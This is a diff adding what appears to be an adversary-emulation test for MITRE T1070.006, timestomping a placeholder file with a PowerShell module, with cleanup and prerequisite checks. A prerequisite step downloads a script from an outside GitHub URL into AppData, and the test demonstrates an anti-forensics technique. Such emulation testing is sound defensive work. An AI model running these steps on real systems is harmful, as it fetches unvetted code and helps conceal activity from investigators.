@@ -1,3 +1,38 @@
+# T1070.006 - Indicator Removal on Host: Timestomp Test 4 - Timestomp a File
+# Local src file directory: $env:temp\aet\kaskaskia\src
+# Output directory $env:temp\aet\kaskaskia\outputs
+# Remote directory https://raw.githubusercontent.com/jsprat000/bin/main/
+# Run with powershell
+import-module $env:appdata\Microsoft\timestomp.ps1
+timestomp -dest "$env:appdata\Microsoft\kxwn.lock"
+
+# Cleanup Commands:
+Remove-Item $env:appdata\Microsoft\timestomp.ps1 -ErrorAction Ignore
+Remove-Item $env:appdata\Microsoft\kxwn.lock -ErrorAction Ignore
+
+# Dependencies: Run with powershell!
+Check Prereq Commands:
+if (Test-Path $env:appdata\Microsoft\timestomp.ps1) {
+	  write-host "Dependencies exist. T1070.006 - Indicator Removal on Host: Timestomp Test 4 - Timestomp a File - Modify file creation timestamp" -ForegroundColor Green
+	} else {
+		write-host "Dependencies do not exist. T1070.006 - Indicator Removal on Host: Timestomp Test 4 - Timestomp a File - Modify file creation timestamp" -ForegroundColor Red
+	}
+
+# Get Prereq Commands:
+Invoke-WebRequest "https://raw.githubusercontent.com/jsprat000/bin/main/timestomp.ps1" -OutFile "$env:appdata\Microsoft\timestomp.ps1"
+
+# Check Prereq Commands:
+if (Test-Path -path "$env:appdata\Microsoft\kxwn.lock") {
+	  write-host "Dependencies exist. T1070.006 - Indicator Removal on Host: Timestomp Test 4 - Timestomp a File - Modify file creation timestamp" -ForegroundColor Green
+	} else {
+		write-host "Dependencies do not exist. T1070.006 - Indicator Removal on Host: Timestomp Test 4 - Timestomp a File - Modify file creation timestamp" -ForegroundColor Red
+	}
+
+# Get Prereq Commands:
+New-Item -Path $env:appdata\Microsoft\kxwn.lock -ItemType File
+
+
+
 # T1070.006 - Indicator Removal on Host: Timestomp Test 2 - Modify file last modified timestamp
 # Local src file directory: $env:temp\aet\kaskaskia\src
 # Output directory $env:temp\aet\kaskaskia\outputs
